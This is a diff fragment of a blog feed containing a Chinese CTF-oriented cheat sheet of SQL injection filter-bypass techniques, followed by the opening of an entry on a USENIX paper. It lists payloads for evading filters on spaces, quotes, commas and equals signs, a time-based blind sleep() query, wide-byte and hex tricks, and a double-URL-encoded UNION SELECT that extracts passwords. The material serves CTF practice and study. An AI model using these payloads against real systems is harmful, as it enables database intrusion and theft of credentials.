+<p><strong>这里需要注意一点就是or被过滤的时候order,information中的or也被过滤了</strong></p>
+<hr>
+<p>###二.对特殊字符的绕过</p>
+<ul>
+<li><p>对空格的绕过:</br></p>
+<pre>两个空格代替一个,用tab键代替空格
+`/**/ %20 %09 %0a` 
+利用空格绕过:很多关键字都可以写成带括号的形式select(),or()
+特殊函数中的空格绕过:ascii(mid(xxfrom(1))) ascii(substr(xxfrom(1)))</pre>
+</li>
+<li><p>对单引号的绕过:</br><br><code>宽字节 %bf%27 %df%27 %aa%27(争对字符集为GBK时使用</code></br><br><code>十六进制绕过(针对需要输入表名的时候 &#39;user&#39;=&gt;0x7573657273)</code></br></p>
+</li>
+<li><p>对逗号的绕过:</p>
+  <pre>
+  substr(x,1,1),mid(x,1,1)=>substr(x from 1 for 1) mid(x from 1 for 1)
+  limit 0,1=> limit 0 offset 1
+  join(本身是用来连接两个表单的,所以join一定是要放在from后面放表单的位置):
+  union select 1,2 =>
+  union select * from (select 1)a join (select 2)b
+  select case when (条件) then (代码1) else (代码2) end 可以对应上if(条件,代码1,代码2)
+  if(substring((select user()) from 1 for 1)='e',sleep(5),1)
+  可以变为
+  select case when substring((select user()) from 1 for 1)='e' then sleep(5) else 1 end
+   </pre>
+</li>
+<li><p>等号的绕过:</p>
+<pre>
+  利用<>(即不等于号)绕过
+  利用like绕过
+  利用greatest()绕过(greatest(a,b)返回较大的那个数)
+  ?id=' or 1 like 1
+  ?id=' or 1 <> 1
+  ?id=' union select greatest(substr((select user()),1,1),95)
+</pre>
+
+</li>
+</ul>
+<hr>
+<p>###三.其他类型的绕过</p>
+<ul>
+<li><p>编码绕过:</p>
+<pre>
+  * 双重url编码:?id=1%252f%252aUNION%252f%252aSELECT%252f%252a1,2,password%252f%252aFROM%252f%252a/Users--+
+  * unicode编码:'=> %u0037 %u02b9
+                空格=> %u0020 %uff00
+                左括号=> %u0028 %uff08
+                  右括号=> %u0029 %uff09
+</pre>    
+</li>
+<li><p>相同字符的绕过:</br><br>题目中有是可能会出现一种情况:</p>
+<blockquote>
+<p>它不允许出现某个字符串,但是在数据库中又确实存在这个字符串,再加之mysql与php的编码字符集不相同,便可以利用相似的字符将其绕过</p>
+</blockquote>
+</li>
+</ul>
+<p><figure class="figure"><img src="https://i.loli.net/2018/09/13/5b9a54128b0b7.png" alt="1.png"><figcaption class="figure__caption">1.png</figcaption></figure></p>
+<p>可以参考的题目<a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">百度杯十月场look</a></p>
+]]></content>
+      <categories>
+        <category>Web Security</category>
+      </categories>
+      <tags>
+        <tag>Sql</tag>
+      </tags>
   </entry>
   <entry>
     <title>(USENIX)读书笔记 Automatically Identifying and Understanding Dark Jargons from Cybercrime Marketplaces</title>
